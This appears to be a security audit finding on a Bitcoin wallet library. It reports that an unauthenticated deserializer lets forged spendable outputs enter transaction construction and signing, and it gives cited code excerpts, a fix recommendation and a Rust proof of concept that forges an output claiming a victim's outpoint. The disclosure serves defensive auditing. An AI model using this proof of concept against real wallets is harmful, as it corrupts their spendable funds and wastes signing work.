### Title
Forged serialized `ReceivedOutput` is accepted as spendable input - (File: `networks/bitcoin/src/wallet/mod.rs`)

### Summary
`ReceivedOutput::read` deserializes the scalar offset, claimed `TxOut`, and `OutPoint` as three independent, unauthenticated fields without proving that the output exists on-chain or that the supplied offset derives the output’s key. [1](#0-0) [2](#0-1)  An attacker who can replace the serialized output bytes between scanning and spending can therefore alter the amount, script, or outpoint while keeping the object syntactically valid. [3](#0-2) 

### Finding Description
Normally, `Scanner::scan_transaction` constructs a `ReceivedOutput` from a transaction output and a script-to-offset mapping created by `Scanner::register_offset`. [4](#0-3) [5](#0-4)  The deserializer bypasses that construction and directly accepts attacker-supplied values for all three fields. [6](#0-5)  `SignableTransaction::new` then trusts `input.output.value` for available funds, `input.outpoint` for the transaction input, and `input.offset` for later key derivation. [7](#0-6)  `SignableTransaction::multisig` checks only that `p2tr_script_buf(key + G * offset)` equals the claimed `TxOut.script_pubkey`; it does not verify that the referenced outpoint actually contains that claimed `TxOut`. [8](#0-7)  Consequently, an attacker can claim an arbitrary or third-party UTXO is a wallet output by supplying the wallet script and a matching offset while retaining the victim’s outpoint. [6](#0-5) [7](#0-6) 

### Impact Explanation
This is a medium-severity integrity issue: inventory reconstructed from untrusted bytes can report funds as wallet-owned when they are not spendable, and transaction creation can consume the claimed value as though it were available. [9](#0-8) [7](#0-6)  If the forged script matches the wallet-derived key, the signing path proceeds and produces signatures for a transaction whose stated prevouts do not match the actual UTXO set, causing the resulting spend to be invalid under Taproot consensus rules. [8](#0-7) [10](#0-9)  This can poison a wallet/scheduler’s spendable set and repeatedly direct signing work toward transactions that cannot confirm. [11](#0-10) 

### Likelihood Explanation
The attack requires an untrusted party to supply or replace bytes passed to `ReceivedOutput::read`, which is explicitly exposed as a public deserializer and does not authenticate its source. [2](#0-1)  No private key, threshold cooperation, malformed encoding, or blockchain consensus violation is needed to construct the forged object. [6](#0-5)  The attack is most relevant where scanned outputs are persisted, relayed, queued, or reconstructed from storage that is not integrity-protected. [12](#0-11) 

### Recommendation
Do not expose `ReceivedOutput::read` as an unauthenticated constructor of spendable outputs. [2](#0-1)  Prefer a validating constructor such as `ReceivedOutput::read_for_key(r, group_key, registered_offsets)`, which recomputes the expected script from `group_key + G * offset`, rejects unknown offsets or mismatched scripts, and requires the caller to verify the decoded outpoint and full `TxOut` against the chain before treating it as spendable. [13](#0-12) [8](#0-7)  If serialized outputs are only intended for trusted local persistence, make that boundary private or authenticate the encoding so an external party cannot substitute the offset, `TxOut`, or `OutPoint` after scanning. [12](#0-11) 

### Proof of Concept
```rust
use bitcoin::{
  consensus::serialize,
  Amount, OutPoint, TxOut,
};
use k256::Scalar;
use bitcoin_serai::wallet::{p2tr_script_buf, ReceivedOutput, SignableTransaction};

// `key` is the wallet's already-tweaked, even-Y threshold group key.
// `victim_outpoint` identifies an existing UTXO which is not controlled by `key`
// and whose actual amount/script differ from the forged claims.
fn forged_received_output(
  key: k256::ProjectivePoint,
  victim_outpoint: OutPoint,
) -> ReceivedOutput {
  let mut bytes = Vec::new();

  // Claim the wallet's base offset.
  bytes.extend(Scalar::ZERO.to_bytes());

  // Claim the victim's outpoint contains a large output paying the wallet key.
  bytes.extend(serialize(&TxOut {
    value: Amount::from_sat(100_000),
    script_pubkey: p2tr_script_buf(key).unwrap(),
  }));

  // The outpoint remains the victim's/non-wallet UTXO.
  bytes.extend(serialize(&victim_outpoint));

  // This succeeds despite the tuple never having been produced by Scanner.
  ReceivedOutput::read(&mut bytes.as_slice()).unwrap()
}

let forged = forged_received_output(group_key, victim_outpoint);

// Transaction construction accepts the forged claimed value and outpoint.
let tx = SignableTransaction::new(
  vec![forged],
  &[(p2tr_script_buf(group_key).unwrap(), 50_000)],
  None,
  None,
  20,
).unwrap();

// The only local consistency check compares the supplied offset and script.
// It therefore accepts the forged output for signing even though the real
// `victim_outpoint` does not contain the supplied `TxOut`.
let machine = tx.multisig(&threshold_keys).unwrap();
```

The claimed script deliberately matches `group_key`, so the offset/script check passes. [8](#0-7)  The resulting transaction nevertheless references the victim outpoint and commits to the forged prevout amount during signing, so Bitcoin nodes reject the completed spend rather than making those funds available. [14](#0-13) [15](#0-14)

### Citations

**File:** networks/bitcoin/src/wallet/mod.rs (L88-96)
```rust
/// A spendable output.
#[derive(Clone, PartialEq, Eq, Debug)]
pub struct ReceivedOutput {
  // The scalar offset to obtain the key usable to spend this output.
  offset: Scalar,
  // The output to spend.
  output: TxOut,
  // The TX ID and vout of the output to spend.
  outpoint: OutPoint,
```

**File:** networks/bitcoin/src/wallet/mod.rs (L115-118)
```rust
  /// The value of this output.
  pub fn value(&self) -> u64 {
    self.output.value.to_sat()
  }
```

**File:** networks/bitcoin/src/wallet/mod.rs (L120-134)
```rust
  /// Read a ReceivedOutput from a generic satisfying Read.
  #[cfg(feature = "std")]
  pub fn read<R: Read>(r: &mut R) -> io::Result<ReceivedOutput> {
    let offset = Secp256k1::read_F(r)?;
    let output;
    let outpoint;
    {
      let mut buf_r = BufReader::with_capacity(0, r);
      output =
        TxOut::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid TxOut"))?;
      outpoint =
        OutPoint::consensus_decode(&mut buf_r).map_err(|_| io::Error::other("invalid OutPoint"))?;
    }
    Ok(ReceivedOutput { offset, output, outpoint })
  }
```

**File:** networks/bitcoin/src/wallet/mod.rs (L136-148)
```rust
  /// Write a ReceivedOutput to a generic satisfying Write.
  pub fn write<W: Write>(&self, w: &mut W) -> io::Result<()> {
    w.write_all(&self.offset.to_bytes())?;
    w.write_all(&serialize(&self.output))?;
    w.write_all(&serialize(&self.outpoint))
  }

  /// Serialize a ReceivedOutput to a `Vec<u8>`.
  pub fn serialize(&self) -> Vec<u8> {
    let mut res = Vec::new();
    self.write(&mut res).unwrap();
    res
  }
```

**File:** networks/bitcoin/src/wallet/mod.rs (L180-191)
```rust
  pub fn register_offset(&mut self, mut offset: Scalar) -> Option<Scalar> {
    // This loop will terminate as soon as an even point is found, with any point having a ~50%
    // chance of being even
    // That means this should terminate within a very small amount of iterations
    loop {
      match p2tr_script_buf(self.key + (ProjectivePoint::GENERATOR * offset)) {
        Some(script) => {
          if self.scripts.contains_key(&script) {
            None?;
          }
          self.scripts.insert(script, offset);
          return Some(offset);
```

**File:** networks/bitcoin/src/wallet/mod.rs (L198-210)
```rust
  /// Scan a transaction.
  pub fn scan_transaction(&self, tx: &Transaction) -> Vec<ReceivedOutput> {
    let mut res = Vec::new();
    for (vout, output) in tx.output.iter().enumerate() {
      // If the vout index exceeds 2**32, stop scanning outputs
      let Ok(vout) = u32::try_from(vout) else { break };

      if let Some(offset) = self.scripts.get(&output.script_pubkey) {
        res.push(ReceivedOutput {
          offset: *offset,
          output: output.clone(),
          outpoint: OutPoint::new(tx.compute_txid(), vout),
        });
```

**File:** networks/bitcoin/src/wallet/send.rs (L175-184)
```rust
    let input_sat = inputs.iter().map(|input| input.output.value.to_sat()).sum::<u64>();
    let offsets = inputs.iter().map(|input| input.offset).collect();
    let tx_ins = inputs
      .iter()
      .map(|input| TxIn {
        previous_output: input.outpoint,
        script_sig: ScriptBuf::new(),
        sequence: Sequence::MAX,
        witness: Witness::new(),
      })
```

**File:** networks/bitcoin/src/wallet/send.rs (L245-255)
```rust
    Ok(SignableTransaction {
      tx: Transaction {
        version: Version(2),
        lock_time: LockTime::ZERO,
        input: tx_ins,
        output: tx_outs,
      },
      offsets,
      prevouts: inputs.drain(..).map(|input| input.output).collect(),
      needed_fee,
    })
```

**File:** networks/bitcoin/src/wallet/send.rs (L273-281)
```rust
  pub fn multisig(self, keys: &ThresholdKeys<Secp256k1>) -> Option<TransactionMachine> {
    let mut sigs = vec![];
    for i in 0 .. self.tx.input.len() {
      let offset = keys.clone().offset(self.offsets[i]);
      if p2tr_script_buf(offset.group_key())? != self.prevouts[i].script_pubkey {
        None?;
      }

      sigs.push(AlgorithmMachine::new(Schnorr::new(), keys.clone().offset(self.offsets[i])));
```

**File:** networks/bitcoin/src/wallet/send.rs (L373-397)
```rust
    let mut cache = SighashCache::new(&self.tx.tx);
    // Sign committing to all inputs
    let prevouts = Prevouts::All(&self.tx.prevouts);

    let mut shares = Vec::with_capacity(self.sigs.len());
    let sigs = self
      .sigs
      .drain(..)
      .enumerate()
      .map(|(i, sig)| {
        let (sig, share) = sig.sign(
          commitments[i].clone(),
          cache
            .taproot_key_spend_signature_hash(i, &prevouts, TapSighashType::Default)
            // This should never happen since the inputs align with the TX the cache was
            // constructed with, and because i is always < prevouts.len()
            .expect("taproot_key_spend_signature_hash failed to return a hash")
            .as_ref(),
        )?;
        shares.push(share);
        Ok(sig)
      })
      .collect::<Result<_, _>>()?;

    Ok((TransactionSignatureMachine { tx: self.tx.tx, sigs }, shares))
```

**File:** networks/bitcoin/src/wallet/send.rs (L417-427)
```rust
    for (input, schnorr) in self.tx.input.iter_mut().zip(self.sigs.drain(..)) {
      let sig = schnorr.complete(
        shares.iter_mut().map(|(l, shares)| (*l, shares.remove(0))).collect::<HashMap<_, _>>(),
      )?;

      let mut witness = Witness::new();
      witness.push(sig);
      input.witness = witness;
    }

    Ok(self.tx)
```
